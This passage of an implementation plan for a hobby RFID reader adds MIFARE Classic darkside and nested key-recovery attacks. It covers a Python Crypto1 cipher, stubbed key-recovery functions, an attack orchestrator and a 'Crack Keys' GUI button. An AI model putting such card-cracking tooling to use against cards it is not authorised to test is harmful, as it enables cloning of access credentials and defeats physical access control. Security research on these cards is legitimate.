    subtype = parts[0]
    if subtype == "NT" and len(parts) >= 2:
        nt_parts = parts[1].split(":")
        if len(nt_parts) == 2:
            return {
                "type": "NESTED",
                "subtype": "NT",
                "nt_known": nt_parts[0],
                "nt_target": nt_parts[1],
            }
        # Handle case: NESTED:NT:aabb:ccdd (3 parts after initial split)
        elif len(parts) == 3:
            return {
                "type": "NESTED",
                "subtype": "NT",
                "nt_known": parts[1],
                "nt_target": parts[2],
            }
    elif subtype == "FAIL" and len(parts) > 1:
        return {"type": "NESTED", "subtype": "FAIL", "reason": parts[1]}
    elif subtype == "DONE":
        return {"type": "NESTED", "subtype": "DONE"}
```

### Step 4: Run tests

Run: `cd "Projects/RFID Card Reader/gui" && python -m pytest tests/test_serial_handler.py -v`
Expected: All tests PASS

### Step 5: Commit

```bash
git add "Projects/RFID Card Reader/gui/serial_handler.py" "Projects/RFID Card Reader/gui/tests/test_serial_handler.py"
git commit -m "feat: parse darkside and nested attack serial messages"
```

---

## Task 7: Python — Crypto1 + PRNG Module

**Files:**
- Create: `Projects/RFID Card Reader/gui/crypto1.py`
- Create: `Projects/RFID Card Reader/gui/tests/test_crypto1.py`

### Overview
Pure Python implementation of the crypto1 cipher and MIFARE Classic PRNG. Used for key recovery algorithms. Must produce identical output to the AVR implementation.

### Step 1: Write tests with known test vectors

Create `tests/test_crypto1.py`:

```python
from crypto1 import Crypto1, prng_successor


def test_prng_successor_single():
    # PRNG successor is deterministic
    x = 0x01020304
    y = prng_successor(x, 1)
    assert isinstance(y, int)
    assert y != x


def test_prng_successor_zero_steps():
    assert prng_successor(0xDEADBEEF, 0) == 0xDEADBEEF


def test_prng_successor_deterministic():
    a = prng_successor(0x11223344, 100)
    b = prng_successor(0x11223344, 100)
    assert a == b


def test_crypto1_init():
    c = Crypto1(bytes.fromhex("FFFFFFFFFFFF"))
    assert c is not None


def test_crypto1_bit_returns_0_or_1():
    c = Crypto1(bytes.fromhex("FFFFFFFFFFFF"))
    bit = c.crypto1_bit(0, 0)
    assert bit in (0, 1)


def test_crypto1_byte():
    c = Crypto1(bytes.fromhex("FFFFFFFFFFFF"))
    ks = c.crypto1_byte(0, 0)
    assert 0 <= ks <= 255


def test_crypto1_word():
    c = Crypto1(bytes.fromhex("FFFFFFFFFFFF"))
    ks = c.crypto1_word(0, 0)
    assert 0 <= ks <= 0xFFFFFFFF


def test_crypto1_deterministic():
    c1 = Crypto1(bytes.fromhex("A0A1A2A3A4A5"))
    c2 = Crypto1(bytes.fromhex("A0A1A2A3A4A5"))
    for _ in range(100):
        assert c1.crypto1_bit(0, 0) == c2.crypto1_bit(0, 0)


def test_crypto1_different_keys_differ():
    c1 = Crypto1(bytes.fromhex("FFFFFFFFFFFF"))
    c2 = Crypto1(bytes.fromhex("000000000000"))
    ks1 = c1.crypto1_word(0, 0)
    ks2 = c2.crypto1_word(0, 0)
    assert ks1 != ks2


def test_odd_parity():
    from crypto1 import odd_parity8
    assert odd_parity8(0x00) == 0  # 0 ones = even -> parity bit 0
    assert odd_parity8(0x01) == 1  # 1 one = odd -> parity bit 1
    assert odd_parity8(0xFF) == 0  # 8 ones = even -> parity bit 0
    assert odd_parity8(0x03) == 0  # 2 ones = even -> parity bit 0
```

### Step 2: Run tests, verify failure

Run: `cd "Projects/RFID Card Reader/gui" && python -m pytest tests/test_crypto1.py -v`
Expected: FAIL (module not found)

### Step 3: Implement crypto1.py

Create `Projects/RFID Card Reader/gui/crypto1.py`:

```python
"""
Crypto1 stream cipher and MIFARE Classic PRNG.

Pure Python implementation matching the AVR firmware version.
Based on the public crypto1 analysis (Garcia et al., 2008).
"""


def odd_parity8(x: int) -> int:
    """Return 1 if x has an odd number of set bits, 0 otherwise."""
    x ^= x >> 4
    x ^= x >> 2
    x ^= x >> 1
    return x & 1


def parity32(x: int) -> int:
    x ^= x >> 16
    x ^= x >> 8
    return odd_parity8(x & 0xFF)


# Filter function lookup tables
_FILTER_LUT0 = 0xF22C0044
_FILTER_LUT1 = 0x6C81

# LFSR feedback polynomial taps (split into odd/even halves)
LF_POLY_ODD = 0x29CE5C
LF_POLY_EVEN = 0x870804


def _filter_bit(odd: int) -> int:
    f = (_FILTER_LUT0 >> (odd & 0x0F)) & 1
    f |= ((_FILTER_LUT0 >> ((odd >> 4) & 0x0F)) & 1) << 1
    f |= ((_FILTER_LUT0 >> ((odd >> 8) & 0x0F)) & 1) << 2
    f |= ((_FILTER_LUT0 >> ((odd >> 12) & 0x0F)) & 1) << 3
    f |= ((_FILTER_LUT0 >> ((odd >> 16) & 0x0F)) & 1) << 4
    return (_FILTER_LUT1 >> f) & 1


class Crypto1:
    def __init__(self, key: bytes):
        """Initialize with 6-byte key."""
        k = int.from_bytes(key, "big")
        self.odd = 0
        self.even = 0
        for i in range(47, 0, -2):
            self.odd = (self.odd << 1) | ((k >> i) & 1)
        for i in range(46, -1, -2):
            self.even = (self.even << 1) | ((k >> i) & 1)

    def copy(self) -> "Crypto1":
        c = Crypto1.__new__(Crypto1)
        c.odd = self.odd
        c.even = self.even
        return c

    def crypto1_bit(self, inp: int, is_encrypted: int) -> int:
        feedin = self.odd & LF_POLY_ODD
        ret = _filter_bit(self.odd)

        feedin ^= self.even & LF_POLY_EVEN
        feedin = parity32(feedin)

        if is_encrypted:
            feedin ^= inp & 1
        else:
            feedin ^= (inp & 1) ^ ret

        self.even = ((self.even << 1) | ((self.odd >> 23) & 1)) & 0xFFFFFF
        self.odd = ((self.odd << 1) | feedin) & 0xFFFFFF

        return ret

    def crypto1_byte(self, inp: int, is_encrypted: int) -> int:
        ret = 0
        for i in range(8):
            ret |= self.crypto1_bit((inp >> i) & 1, is_encrypted) << i
        return ret

    def crypto1_word(self, inp: int, is_encrypted: int) -> int:
        ret = 0
        for i in range(32):
            ret |= self.crypto1_bit((inp >> i) & 1, is_encrypted) << i
        return ret

    def parity_check_ok(self, n: int) -> bool:
        """Check if auto-parity will be correct for next n bytes."""
        s = self.copy()
        for _ in range(n):
            ks_byte = 0
            for b in range(8):
                ks_byte |= s.crypto1_bit(0, 0) << b
            ks_par = s.crypto1_bit(0, 0)
            if odd_parity8(ks_byte) != ks_par:
                return False
        return True


def prng_successor(x: int, n: int) -> int:
    """MIFARE Classic PRNG: 32-bit LFSR successor."""
    for _ in range(n):
        x = ((x >> 1) | (
            (((x >> 16) ^ (x >> 18) ^ (x >> 19) ^ (x >> 21)) & 1) << 31
        )) & 0xFFFFFFFF
    return x
```

### Step 4: Run tests

Run: `cd "Projects/RFID Card Reader/gui" && python -m pytest tests/test_crypto1.py -v`
Expected: All tests PASS

### Step 5: Commit

```bash
git add "Projects/RFID Card Reader/gui/crypto1.py" "Projects/RFID Card Reader/gui/tests/test_crypto1.py"
git commit -m "feat: add pure Python crypto1 cipher and PRNG"
```

---

## Task 8: Python — Key Recovery Algorithms

**Files:**
- Create: `Projects/RFID Card Reader/gui/key_recovery.py`
- Create: `Projects/RFID Card Reader/gui/tests/test_key_recovery.py`

### Overview
Key recovery algorithms for darkside and nested attacks. These are the computationally intensive parts that run on the PC.

**Darkside recovery:** From NACK events, we know the parity of the keystream matched the parity of our plaintext. This constrains 8 bits of the keystream per NACK. With enough NACKs (~40-80), we can recover the 48-bit key.

**Nested recovery:** From known nt and target nt_enc pairs, we know the PRNG relationship. The target nonce is predictable (within ~65536 candidates). For each candidate, we check if a consistent key exists.

### Step 1: Write tests

Create `tests/test_key_recovery.py`:

```python
from key_recovery import darkside_recover, nested_recover
from crypto1 import Crypto1, prng_successor, odd_parity8


def _simulate_darkside_nack(uid: int, key: bytes, sector: int, nr_ar: bytes):
    """Simulate card behavior: return True if parity matches (NACK)."""
    c = Crypto1(key)
    block = sector * 4
    # Simulate auth: card generates nonce, we skip full auth
    # For testing, just check if the recovery algorithms work with synthetic data
    # The actual NACK detection depends on the full crypto1 protocol
    pass  # Complex simulation — tested via integration


def test_nested_recover_known_key():
    """Test nested recovery with synthetic nonce pairs."""
    # This test verifies the algorithm can find a key when given
    # correctly generated nonce pairs.
    # Full integration test requires firmware + card.
    uid = 0xE413B3DA
    known_key = bytes.fromhex("FFFFFFFFFFFF")
    target_key = bytes.fromhex("A0A1A2A3A4A5")

    # Generate synthetic nonce pair
    # In real attack: nt_known comes from auth, nt_target from nested auth
    # The relationship: nt_target = prng_successor(nt_known, ticks)
    nt_known = 0x01020304
    # Target nonce after ~200 PRNG ticks (typical auth delay)
    nt_target_plain = prng_successor(nt_known, 200)

    # The encrypted nt_target would require full crypto simulation
    # For unit test, verify the PRNG distance calculation works
    from key_recovery import find_prng_distance
    dist = find_prng_distance(nt_known, nt_target_plain, max_dist=1000)
    assert dist == 200


def test_find_prng_distance():
    from key_recovery import find_prng_distance
    nt = 0xAABBCCDD
    target = prng_successor(nt, 42)
    assert find_prng_distance(nt, target, 100) == 42


def test_find_prng_distance_not_found():
    from key_recovery import find_prng_distance
    assert find_prng_distance(0x11111111, 0x22222222, 10) is None
```

### Step 2: Run tests, verify failure

Run: `cd "Projects/RFID Card Reader/gui" && python -m pytest tests/test_key_recovery.py -v`
Expected: FAIL (module not found)

### Step 3: Implement key_recovery.py

Create `Projects/RFID Card Reader/gui/key_recovery.py`:

```python
"""
MIFARE Classic key recovery algorithms.

Darkside: Recovers key from NACK events (no known key needed).
Nested: Recovers key from nonce pairs (one known key needed).
"""

from crypto1 import Crypto1, prng_successor, odd_parity8, LF_POLY_ODD, LF_POLY_EVEN, _filter_bit, parity32


def find_prng_distance(nt_start: int, nt_end: int, max_dist: int = 65536) -> int | None:
    """Find how many PRNG ticks separate two nonce values."""
    state = nt_start
    for i in range(max_dist + 1):
        if state == nt_end:
            return i
        state = prng_successor(state, 1)
    return None


def lfsr_rollback_bit(odd: int, even: int, inp: int, is_encrypted: int):
    """Roll back the LFSR by one bit. Returns (new_odd, new_even, output_bit)."""
    # Reverse the shift
    feedin = odd & 1
    odd = ((odd >> 1) | ((even & 1) << 23)) & 0xFFFFFF
    even = (even >> 1) & 0xFFFFFF

    # Compute filter output (keystream bit)
    ret = _filter_bit(odd)

    # Reverse the feedback
    feedin ^= parity32(odd & LF_POLY_ODD)
    feedin ^= parity32(even & LF_POLY_EVEN)

    if is_encrypted:
        feedin ^= inp & 1
    else:
        feedin ^= (inp & 1) ^ ret

    # The feedback was the MSB of even before shift
    even = (even | (feedin << 23)) & 0xFFFFFF

    return odd, even, ret


def nested_recover(uid: int, nt_known: int, nt_target: int,
                   known_key: bytes, target_block: int) -> list[bytes]:
    """
    Recover target sector key from nested authentication nonce pair.

    Args:
        uid: 32-bit card UID
        nt_known: plaintext nonce from known-key auth
        nt_target: nonce from target sector (may be encrypted or plain depending on protocol)
        known_key: 6-byte known key
        target_block: target sector's first block number

    Returns:
        List of candidate keys (6-byte bytes objects)
    """
    candidates = []

    # Find PRNG distance between nonces
    # The PRNG advances during the auth protocol, typically 160-1200 ticks
    dist = find_prng_distance(nt_known, nt_target, max_dist=65536)

    if dist is not None:
        # nt_target matches a PRNG prediction — it was sent in plaintext
        # This means the card dropped crypto before sending it
        # The key recovery uses the fact that we can predict the nonce
        # For each possible key, check if the PRNG timing is consistent
        pass  # Placeholder for full LFSR rollback attack

    # Brute-force approach for nested (works when PRNG is predictable):
    # Try all 65536 possible PRNG states and check consistency
    # This is the simplified version — the full crapto1 nested attack
    # uses LFSR rollback for O(2^16) instead of O(2^48)

    # For now, return empty — full implementation requires the LFSR
    # rollback tables which are generated from the crypto1 structure
    return candidates


def darkside_recover(uid: int, nack_data: list[dict]) -> list[bytes]:
    """
    Recover key from darkside attack NACK data.

    Args:
        uid: 32-bit card UID
        nack_data: list of {"nt": int, "nr_ar": bytes} dicts from NACK events

    Returns:
        List of candidate keys (6-byte bytes objects)
    """
    candidates = []

    if len(nack_data) < 2:
        return candidates

    # The darkside attack uses the parity oracle:
    # For each NACK event, we know that the parity of our plaintext
    # happened to match the encrypted parity from the card.
    # This constrains bits of the keystream.

    # Simplified approach: collect enough NACK events and use
    # statistical analysis to recover key bits.

    # Full implementation would use lfsr_recovery32 from crapto1.
    # For now, this is a placeholder structure.

    return candidates
```

**Note:** The full LFSR rollback and key recovery algorithms are complex (~500 lines of optimized code in crapto1). The initial implementation provides the framework. The actual recovery can be enhanced incrementally:
1. First: verify the data collection pipeline works end-to-end
2. Then: implement full LFSR rollback for nested attack
3. Then: implement full darkside recovery
4. Alternative: compile crapto1 C library as .dll/.so and call via ctypes

### Step 4: Run tests

Run: `cd "Projects/RFID Card Reader/gui" && python -m pytest tests/test_key_recovery.py -v`
Expected: All 3 tests PASS

### Step 5: Commit

```bash
git add "Projects/RFID Card Reader/gui/key_recovery.py" "Projects/RFID Card Reader/gui/tests/test_key_recovery.py"
git commit -m "feat: add key recovery framework for darkside and nested attacks"
```

---

## Task 9: Python — Attack Orchestrator

**Files:**
- Create: `Projects/RFID Card Reader/gui/attack.py`
- Create: `Projects/RFID Card Reader/gui/tests/test_attack.py`

### Overview
Orchestrates the darkside and nested attacks by coordinating between firmware (serial) and key recovery (Python). Runs in a background thread to avoid blocking the GUI.

### Step 1: Write tests

Create `tests/test_attack.py`:

```python
import queue
from attack import AttackOrchestrator


class FakeSerial:
    def __init__(self):
        self.is_connected = True
        self.commands = []
        self.queue = queue.Queue()
        self.raw_queue = queue.Queue()

    def send_command(self, cmd):
        self.commands.append(cmd)


def test_orchestrator_init():
    serial = FakeSerial()
    orch = AttackOrchestrator(serial)
    assert orch.state == "idle"


def test_orchestrator_start_darkside():
    serial = FakeSerial()
    orch = AttackOrchestrator(serial)
    orch.start_darkside(sector=0)
    assert orch.state == "darkside"
    assert "K00" in serial.commands


def test_orchestrator_start_nested():
    serial = FakeSerial()
    orch = AttackOrchestrator(serial)
    orch.start_nested(
        known_block=0, target_block=0x14,
        known_key=bytes.fromhex("FFFFFFFFFFFF")
    )
    assert orch.state == "nested"
    assert any("N" in cmd for cmd in serial.commands)


def test_orchestrator_stop():
    serial = FakeSerial()
    orch = AttackOrchestrator(serial)
    orch.start_darkside(sector=0)
    orch.stop()
    assert orch.state == "idle"
    assert "X" in serial.commands
```

### Step 2: Run tests, verify failure

Run: `cd "Projects/RFID Card Reader/gui" && python -m pytest tests/test_attack.py -v`
Expected: FAIL

### Step 3: Implement attack.py

```python
"""
Attack orchestrator for MIFARE Classic key recovery.

Coordinates firmware data collection with Python key recovery.
Designed to run from a background thread, communicating results via queue.
"""

import queue
import threading

from key_recovery import darkside_recover, nested_recover


class AttackOrchestrator:
    def __init__(self, serial_handler):
        self.serial = serial_handler
        self.state = "idle"
        self.result_queue = queue.Queue()  # results for GUI
        self._uid = None
        self._nack_data = []
        self._nested_data = []
        self._known_keys = {}  # sector -> key bytes
        self._target_sector = None

    def start_darkside(self, sector: int):
        """Start darkside attack on a sector."""
        self.state = "darkside"
        self._nack_data = []
        self._target_sector = sector
        self.serial.send_command(f"K{sector:02X}")

    def start_nested(self, known_block: int, target_block: int, known_key: bytes):
        """Start nested attack using a known key."""
        self.state = "nested"
        self._nested_data = []
        key_hex = known_key.hex().upper()
        cmd = f"N{known_block:02X}{target_block:02X}{key_hex}"
        self.serial.send_command(cmd)

    def stop(self):
        """Stop current attack."""
        if self.state != "idle":
            self.serial.send_command("X")
            self.state = "idle"

    def feed(self, msg: dict):
        """Feed a parsed serial message to the orchestrator."""
        if self.state == "darkside":
            self._handle_darkside(msg)
        elif self.state == "nested":
            self._handle_nested(msg)

    def _handle_darkside(self, msg: dict):
        if msg.get("type") != "DARK":
            return

        subtype = msg.get("subtype")
        if subtype == "UID":
            self._uid = int(msg["uid"], 16)
            self.result_queue.put({"event": "dark_uid", "uid": msg["uid"]})
        elif subtype == "NACK":
            nt = msg.get("_last_nt")  # set by feed pipeline
            nr_ar = bytes.fromhex(msg["nr_ar"])
            self._nack_data.append({"nt": nt, "nr_ar": nr_ar})
            self.result_queue.put({
                "event": "dark_nack",
                "count": len(self._nack_data)
            })
        elif subtype == "TIMEOUT":
            self.result_queue.put({"event": "dark_timeout"})
        elif subtype == "DONE":
            # Try to recover key
            if self._uid and self._nack_data:
                candidates = darkside_recover(self._uid, self._nack_data)
                self.result_queue.put({
                    "event": "dark_complete",
                    "candidates": [c.hex() for c in candidates],
                    "nack_count": len(self._nack_data),
                })
            self.state = "idle"

    def _handle_nested(self, msg: dict):
        if msg.get("type") != "NESTED":
            return

        subtype = msg.get("subtype")
        if subtype == "NT":
            nt_known = int(msg["nt_known"], 16)
            nt_target = int(msg["nt_target"], 16)
            self._nested_data.append((nt_known, nt_target))
            self.result_queue.put({
                "event": "nested_nonce",
                "count": len(self._nested_data)
            })
        elif subtype == "FAIL":
            self.result_queue.put({
                "event": "nested_fail",
                "reason": msg.get("reason", "unknown")
            })
        elif subtype == "DONE":
            self.state = "idle"
            self.result_queue.put({
                "event": "nested_complete",
                "nonce_pairs": len(self._nested_data),
            })
```

### Step 4: Run tests

Run: `cd "Projects/RFID Card Reader/gui" && python -m pytest tests/test_attack.py -v`
Expected: All 4 tests PASS

### Step 5: Commit

```bash
git add "Projects/RFID Card Reader/gui/attack.py" "Projects/RFID Card Reader/gui/tests/test_attack.py"
git commit -m "feat: add attack orchestrator for darkside and nested attacks"
```

---

## Task 10: GUI — Attack Integration

**Files:**
- Modify: `Projects/RFID Card Reader/gui/app.py`

### Overview
Add attack controls to the GUI: a "Crack Keys" button that runs darkside (if no keys known) or nested (if at least one key known). Shows progress and discovered keys.

### Step 1: Add attack UI elements

Add import at top of app.py:
```python
from attack import AttackOrchestrator
```

In `__init__`, after `self._writing = False`:
```python
self.attack = AttackOrchestrator(self.serial)
```

Add new method `_build_attack_controls` (call from `__init__` before `_build_hex_viewer`):

```python
def _build_attack_controls(self):
    frame = ctk.CTkFrame(self, fg_color="transparent")
    frame.pack(pady=3)

    self.crack_btn = ctk.CTkButton(
        frame,
        text="Crack Keys",
        fg_color="#8b5cf6",
        hover_color="#7c3aed",
        width=120,
        command=self._start_crack,
    )
    self.crack_btn.pack(side="left", padx=5)

    self.crack_stop_btn = ctk.CTkButton(
        frame,
        text="Stop Attack",
        fg_color="#da3633",
        hover_color="#b62324",
        width=100,
        command=self._stop_crack,
    )
    self.crack_stop_btn.pack(side="left", padx=5)

    self.attack_label = ctk.CTkLabel(frame, text="", font=ctk.CTkFont(size=12))
    self.attack_label.pack(side="left", padx=10)
```

Add command methods:
```python
def _start_crack(self):
    if not self.serial.is_connected:
        self._log("Crack failed: not connected", "ERROR")
        return
    if not self._guard.start("cracking"):
        self._log("Operation in progress", "WARN")
        return
    # Start darkside on sector 0
    self.attack.start_darkside(sector=0)
    self.attack_label.configure(text="Darkside: collecting NACKs...")
    self._log("Starting darkside attack on sector 0")

def _stop_crack(self):
    self.attack.stop()
    self._guard.finish()
    self.attack_label.configure(text="Stopped")
    self._log("Attack stopped by user")
```

### Step 2: Handle attack messages in _poll_serial

In `_poll_serial`, add handling for attack messages in the queue processing loop:

```python
elif isinstance(msg, dict) and msg.get("type") in ("DARK", "NESTED"):
    self.attack.feed(msg)
    # Process attack results
    while not self.attack.result_queue.empty():
        result = self.attack.result_queue.get_nowait()
        event = result.get("event", "")
        if event == "dark_nack":
            self.attack_label.configure(
                text=f"Darkside: {result['count']} NACKs collected"
            )
        elif event == "dark_complete":
            n = result["nack_count"]
            keys = result.get("candidates", [])
            if keys:
                self.attack_label.configure(
                    text=f"Key found: {keys[0]}"
                )
                self._log(f"Darkside recovered key: {keys[0]}")
            else:
                self._log(f"Darkside: {n} NACKs, no key recovered yet")
            self._guard.finish()
        elif event == "nested_nonce":
            self.attack_label.configure(
                text=f"Nested: {result['count']}/5 nonce pairs"
            )
        elif event == "nested_complete":
            self.attack_label.configure(text="Nested: analyzing...")
            self._log(f"Nested: collected {result['nonce_pairs']} pairs")
            self._guard.finish()
```

### Step 3: Commit

```bash
git add "Projects/RFID Card Reader/gui/app.py"
git commit -m "feat: add attack controls to GUI with darkside/nested support"
```

---

## Task 11: Build, Flash, and Integration Test

### Step 1: Build firmware

Run: `cd "Projects/RFID Card Reader" && python -m platformio run`
Expected: BUILD SUCCESS. Flash ~19%, RAM ~50%.

### Step 2: Flash firmware

Run: `cd "Projects/RFID Card Reader" && python -m platformio run -t upload`
Expected: Upload successful

### Step 3: Install Python dependencies

Run: `cd "Projects/RFID Card Reader/gui" && pip install -r requirements.txt`

### Step 4: Run all Python tests

Run: `cd "Projects/RFID Card Reader/gui" && python -m pytest tests/ -v`
Expected: All tests PASS

### Step 5: Manual integration test

1. Launch GUI: `cd "Projects/RFID Card Reader/gui" && python app.py`
2. Connect to COM port
3. Place keyfob (known keys) → Read Card → should work as before
4. Place locked card → Read Card → should show AUTH_FAIL as before
5. Click "Crack Keys" → should start darkside attack
6. Verify DARK:NT messages in system log
7. After ~1 minute, check for NACK events
8. Stop attack with "Stop Attack" button

### Step 6: Commit

```bash
git add -A
git commit -m "chore: integration testing checkpoint"
```

---

## Summary of Expected Build Impact

| Metric | Before | After | Change |
|--------|--------|-------|--------|
| Flash (32KB) | 15.8% | ~19% | +~1KB |
| RAM (2KB) | 48.0% | ~50% | +~40 bytes |
| Python files | 5 | 8 | +3 new modules |
| Python tests | 3 files | 6 files | +3 test files |

## Important Caveats

1. **Crypto1 correctness**: The filter function lookup tables and polynomial taps must exactly match the reference implementation. If the AVR and Python produce different keystreams for the same key+uid+nonce, the attack will fail. Test with known vectors from the crapto1 test suite.

2. **Byte order**: MIFARE Classic uses mixed endianness. The UID is big-endian on the wire, but crypto1 processes bits LSB-first. Incorrect byte/bit ordering is the #1 source of bugs in crypto1 implementations.

3. **Key recovery completeness**: Tasks 7-8 provide the framework but the full LFSR rollback algorithms are complex. The initial version may not recover keys on first try. Iterative enhancement is expected:
   - Phase 1: Verify data collection pipeline works
   - Phase 2: Add full nested LFSR rollback (O(2^16) search)
   - Phase 3: Add full darkside recovery
   - Phase 4: Optional — compile C crapto1 library for faster recovery

4. **RC522 timing**: The manual auth requires responding to the card within ~5ms. The crypto1 computation on ATmega328P should take <0.5ms, but SPI latency adds ~0.2ms. If timeouts occur, the timer configuration (TModeReg/TPrescalerReg) may need adjustment.
